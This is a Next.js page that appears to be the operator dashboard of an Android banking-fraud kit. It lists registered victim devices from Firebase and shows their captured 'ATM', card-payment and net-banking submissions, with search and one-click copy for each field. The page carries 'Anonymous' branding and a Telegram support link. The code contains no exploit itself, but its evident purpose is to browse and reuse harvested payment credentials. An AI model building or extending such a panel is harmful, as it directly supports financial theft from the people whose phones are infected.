"use client";

import Link from "next/link";
import { usePathname, useRouter } from "next/navigation";
import { db } from "@/lib/firbase";
import { Card } from "@heroui/react";
import { onValue, ref } from "firebase/database";
import { useEffect, useMemo, useState } from "react";
import { FaCopy } from "react-icons/fa";
import LineSpinner from "@/components/LineSpinner";


const FORM_KEYS = ["atm_submittion", "atm_submissions", "form_submissions"];
const CARD_KEYS = ["card_payment", "card_payment_data", "card", "payment"];
const NETBANK_KEYS = ["netbanking", "netbanking_data"];

type SubmissionRecord = {
  id: string;
  [key: string]: unknown;
};

type DeviceRecord = {
  id: string;
  brand: string;
  model: string;
  androidVersion: string;
  joinedAt: string;
  formSubmissions: SubmissionRecord[];
  cardSubmissions: SubmissionRecord[];
  netBankingSubmissions: SubmissionRecord[];
};

type ExtendedSubmission = SubmissionRecord & {
  type: 'form' | 'card' | 'netbanking';
};

function formatSmartTime(value: number) {
  const timestamp = new Date(value).getTime();

  if (isNaN(timestamp)) return "N/A";
  if (timestamp <= 0) return "Just now";

  const now = Date.now();
  const diffMs = now - timestamp;

  if (diffMs <= 0) return "Just now";

  const minutes = Math.floor(diffMs / (60 * 1000));
  const hours = Math.floor(diffMs / (60 * 60 * 1000));
  const days = Math.floor(diffMs / (24 * 60 * 60 * 1000));

  if (days > 0) return `${days}d ago`;
  if (hours > 0) return `${hours}h ago`;
  if (minutes > 0) return `${minutes}m ago`;

  return "Just now";
}

function parseTimestamp(value: unknown): number {
  if (typeof value === "number" && Number.isFinite(value)) {
    return value < 1_000_000_000_000 ? value * 1000 : value;
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (!trimmed) {
      return 0;
    }

    if (/^\d+$/.test(trimmed)) {
      const numericValue = Number(trimmed);
      return trimmed.length <= 10 ? numericValue * 1000 : numericValue;
    }

    const parsed = Date.parse(trimmed);
    return Number.isNaN(parsed) ? 0 : parsed;
  }

  return 0;
}

function formatTimestampValue(value: unknown) {
  const timestamp = parseTimestamp(value);

  if (!timestamp) {
    return "N/A";
  }

  return new Date(timestamp).toLocaleString();
}

function formatDisplayValue(key: string, value: unknown) {
  if (value === null || value === undefined || value === "") {
    return "N/A";
  }

  const keyName = key.toLowerCase();

  if (
    keyName.includes("timestamp") ||
    keyName.includes("createdat") ||
    keyName.includes("updatedat")
  ) {
    return "";
  }

  if (typeof value === "object") {
    try {
      return JSON.stringify(value);
    } catch {
      return "Invalid data";
    }
  }

  return String(value);
}

function sortSubmissionsByLatest(items: SubmissionRecord[]) {
  return items.slice().sort((a, b) => {
    const bTime = parseTimestamp(b.timestamp ?? b.createdAt ?? b.updatedAt);
    const aTime = parseTimestamp(a.timestamp ?? a.createdAt ?? a.updatedAt);
    return bTime - aTime;
  });
}

function compareDeviceDesc(a: DeviceRecord, b: DeviceRecord) {
  return b.id.localeCompare(a.id, undefined, {
    numeric: true,
    sensitivity: "base",
  });
}

function getDeviceName(device: DeviceRecord) {
  const name = `${device.brand} ${device.model}`.trim();
  return name === "" ? "Unknown Device" : name;
}

function selectFirstAvailable<T = unknown>(
  record: Record<string, unknown>,
  keys: string[],
) {
  for (const key of keys) {
    if (record[key] !== undefined && record[key] !== null) {
      return record[key] as T;
    }
  }
  return undefined;
}

function mapSubmissions(
  data: unknown,
  fallbackSortField?: "timestamp" | "createdAt",
) {
  if (!data || typeof data !== "object") {
    return [];
  }

  const entries = Object.entries(
    data as Record<string, Record<string, unknown>>,
  ).map(([key, value]) => ({
    id: key,
    ...value,
    ...(fallbackSortField &&
    value &&
    typeof value === "object" &&
    value[fallbackSortField] === undefined
      ? { [fallbackSortField]: 0 }
      : {}),
  }));

  return sortSubmissionsByLatest(entries);
}

export default function FormPage() {
  const pathname = usePathname();
  const router = useRouter();
  const [devices, setDevices] = useState<DeviceRecord[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const registerDevicesRef = ref(db, "registeredDevices");

    const unsubscribe = onValue(registerDevicesRef, (snapshot) => {
      try {
        if (!snapshot.exists()) {
          setDevices([]);
          setIsLoading(false);
          return;
        }

        const data = snapshot.val() as Record<string, Record<string, unknown>>;

        const nextDevices: DeviceRecord[] = Object.entries(data)
          .map(([deviceId, rawDevice]) => ({
            id: deviceId,
            brand:
              typeof rawDevice.brand === "string" ? rawDevice.brand : "Unknown",
            model:
              typeof rawDevice.model === "string" ? rawDevice.model : "Unknown",
            androidVersion:
              typeof rawDevice.androidVersion === "string" ||
              typeof rawDevice.androidVersion === "number"
                ? String(rawDevice.androidVersion)
                : "Unknown",
            joinedAt: formatTimestampValue(rawDevice.joinedAt),
            formSubmissions: mapSubmissions(
              selectFirstAvailable(rawDevice, FORM_KEYS),
              "timestamp",
            ),
            cardSubmissions: mapSubmissions(
              selectFirstAvailable(rawDevice, CARD_KEYS),
              "createdAt",
            ),
            netBankingSubmissions: mapSubmissions(
              selectFirstAvailable(rawDevice, NETBANK_KEYS),
              "createdAt",
            ),
          }))
          .filter(
            (device) =>
              device.formSubmissions.length > 0 ||
              device.cardSubmissions.length > 0 ||
              device.netBankingSubmissions.length > 0,
          )
          .sort(compareDeviceDesc);

        setDevices(nextDevices);
      } catch (error) {
        console.error("Error loading devices:", error);
        setDevices([]);
      } finally {
        setIsLoading(false);
      }
    }, (error) => {
      console.error("Firebase error:", error);
      setDevices([]);
      setIsLoading(false);
    });

    return () => unsubscribe();
  }, []);

  const filteredDevices = useMemo(() => {
    const query = searchQuery.trim().toLowerCase();

    if (!query) {
      return devices;
    }

    return devices.filter((device) => {
      const matchesDevice =
        device.id.toLowerCase().includes(query) ||
        device.brand.toLowerCase().includes(query) ||
        device.model.toLowerCase().includes(query) ||
        getDeviceName(device).toLowerCase().includes(query);

      const submissionText = [
        ...device.formSubmissions,
        ...device.cardSubmissions,
        ...device.netBankingSubmissions,
      ]
        .flatMap((submission) => Object.values(submission))
        .map((value) => String(value ?? "").toLowerCase())
        .join(" ");

      return matchesDevice || submissionText.includes(query);
    });
  }, [devices, searchQuery]);

  const copyToClipboard = async (text: string, e: React.MouseEvent) => {
    e.stopPropagation();
    
    if (typeof window === "undefined") {
      return;
    }

    try {
      await navigator.clipboard.writeText(text);
    } catch {
      const textarea = document.createElement("textarea");
      textarea.value = text;
      textarea.setAttribute("readonly", "");
      textarea.style.position = "fixed";
      textarea.style.opacity = "0";
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
    }
  };

  const handleCardClick = (deviceId: string) => {
    if (!deviceId || deviceId === "Unknown") {
      return;
    }
    
    const url = `/devices/${deviceId}`;
    window.open(url, '_blank');
  };

  const getAllSubmissions = (device: DeviceRecord): ExtendedSubmission[] => {
    const allSubmissions: ExtendedSubmission[] = [
      ...device.formSubmissions.map(s => ({ ...s, type: 'form' as const })),
      ...device.cardSubmissions.map(s => ({ ...s, type: 'card' as const })),
      ...device.netBankingSubmissions.map(s => ({ ...s, type: 'netbanking' as const }))
    ];
    
    return allSubmissions.sort((a, b) => {
      const aTime = parseTimestamp(a.timestamp ?? a.createdAt ?? a.updatedAt);
      const bTime = parseTimestamp(b.timestamp ?? b.createdAt ?? b.updatedAt);
      return bTime - aTime;
    });
  };

  return (
    <div className="min-h-screen bg-white">
      <header className="w-full bg-black">
        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4 gap-4">
          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#8B0000] shrink-0">
            Anonymous
          </Link>
          <nav className="flex items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base overflow-x-auto whitespace-nowrap scrollbar-hide">
            <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Home
            </Link>
            <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Setting
            </Link>
            <a
              href="https://t.me/Sanjay_Mishra00?text=Hello%20Babydon%2C%20please%20fix%20my%20harmful%20issue%20as%20soon%20as%20possible."
              target="_blank"
              rel="noopener noreferrer"
              className="text-white/85 transition-colors hover:text-white"
            >
              Support
            </a>
            <button
              onClick={async () => {
                await fetch("/api/logout", { method: "POST" });
                router.push("/login");
              }}
              className="text-white/85 transition-colors hover:text-white cursor-pointer"
            >
              Logout
            </button>
          </nav>
        </div>
      </header>

      {isLoading ? (
        <div className="flex justify-center items-center min-h-[60vh]">
          <LineSpinner />
        </div>
      ) : (
        <main className="mx-auto w-full max-w-3xl px-5 py-8">
          <div className="space-y-5 rounded-[14px] border border-gray-300 bg-gray-100 p-5">
            <div className="flex items-center gap-3">
              <select
                aria-label="Filter forms"
                className="h-12 flex-1 rounded-2xl border-2 border-gray-400 bg-gray-100 px-4 text-base font-semibold text-gray-800 outline-none"
                onChange={(e) => router.push(e.target.value)}
                value={pathname}
              >
                <option value="/all">All</option>
                <option value="/messages">Messages</option>
                <option value="/forms">Forms</option>
                <option value="/devices">Devices</option>
              </select>
              <button onClick={() => window.location.reload()} className="h-12 rounded-2xl border-2 border-gray-400 bg-gray-100 px-6 text-base font-semibold text-gray-800 transition hover:bg-gray-200">
                NEW
              </button>
            </div>

            <div className="relative">
              <span className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-base text-gray-500">
                ⌕
              </span>
              <input
                type="text"
                value={searchQuery}
                onChange={(event) => setSearchQuery(event.target.value)}
                placeholder="Search Data By Any Field"
                className="h-12 w-full rounded-2xl border-2 border-gray-400 bg-gray-100 pl-10 pr-4 text-base text-gray-800 outline-none placeholder:text-gray-500"
              />
            </div>

            {filteredDevices.length === 0 ? (
              <div className="p-10 text-center border border-gray-300 bg-white rounded-lg">
                <p className="text-lg font-semibold text-gray-700">
                  No matching devices found
                </p>
                <p className="mt-2 text-sm text-gray-500">
                  Try a different search term or wait for new submissions.
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                {filteredDevices.map((device) => {
                  const allSubmissions = getAllSubmissions(device);
                  
                  if (allSubmissions.length === 0) return null;
                  
                  return (
                    <div
                      key={device.id}
                      onClick={() => handleCardClick(device.id)}
                      className="cursor-pointer"
                    >
                      <Card className="w-full bg-white shadow-sm hover:shadow-md transition-shadow">
                        <div className="p-5">
                          {/* Device Info */}
                          <div className="mb-4 pb-3 border-b border-gray-200">
                            <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                              <span className="text-xs font-mono text-gray-600 bg-gray-100 px-2 py-1 rounded">
                                {device.id}
                              </span>
                              <div className="flex items-center gap-2 text-xs text-gray-500">
                                <span>{device.brand} {device.model}</span>
                                {device.androidVersion !== "Unknown" && (
                                  <span>• Android {device.androidVersion}</span>
                                )}
                                <span>• {device.joinedAt}</span>
                              </div>
                            </div>
                          </div>

                          {/* Submissions */}
                          <div className="space-y-4">
                            {allSubmissions.map((submission) => {
                              const timestampValue = submission.timestamp || submission.createdAt || submission.updatedAt;
                              const timestamp = timestampValue ? parseTimestamp(timestampValue) : 0;
                              
                              const submissionType = submission.type;
                              let typeLabel = '';
                              let typeColor = '';
                              if (submissionType === 'form') {
                                typeLabel = 'FORM';
                                typeColor = 'text-blue-600 bg-blue-50';
                              } else if (submissionType === 'card') {
                                typeLabel = 'CARD';
                                typeColor = 'text-purple-600 bg-purple-50';
                              } else if (submissionType === 'netbanking') {
                                typeLabel = 'NETBANKING';
                                typeColor = 'text-green-600 bg-green-50';
                              }

                              return (
                                <div key={submission.id} className="border-l-2 border-gray-200 pl-3">
                                  <div className="flex items-center gap-2 mb-2">
                                    <span className={`text-xs font-semibold px-2 py-0.5 rounded ${typeColor}`}>
                                      {typeLabel}
                                    </span>
                                    {timestamp > 0 && (
                                      <span className="text-xs text-gray-400">
                                        {formatSmartTime(timestamp)}
                                      </span>
                                    )}
                                  </div>
                                  
                                  <div className="space-y-2">
                                    {Object.entries(submission).map(([key, value]) => {
                                      const keyLower = key.toLowerCase();
                                      if (
                                        key === "id" ||
                                        key === "type" ||
                                        keyLower.includes("timestamp") ||
                                        keyLower.includes("createdat") ||
                                        keyLower.includes("updatedat")
                                      ) {
                                        return null;
                                      }
                                      
                                      const displayValue = formatDisplayValue(key, value);
                                      if (!displayValue || displayValue === "") return null;
                                      
                                      return (
                                        <div key={key} className="group">
                                          <div className="flex items-center gap-1 mb-1">
                                            <span className="font-semibold text-gray-700 text-xs uppercase tracking-wide">
                                              {key}:
                                            </span>
                                            <FaCopy
                                              size={11}
                                              onClick={(e) => copyToClipboard(String(value), e)}
                                              className="cursor-pointer text-gray-400 hover:text-gray-600 transition-colors"
                                            />
                                          </div>
                                          <div className="text-sm text-gray-700 break-all leading-relaxed">
                                            {displayValue}
                                          </div>
                                        </div>
                                      );
                                    })}
                                  </div>
                                </div>
                              );
                            })}
                          </div>
                        </div>
                      </Card>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </main>
      )}
    </div>
  );
}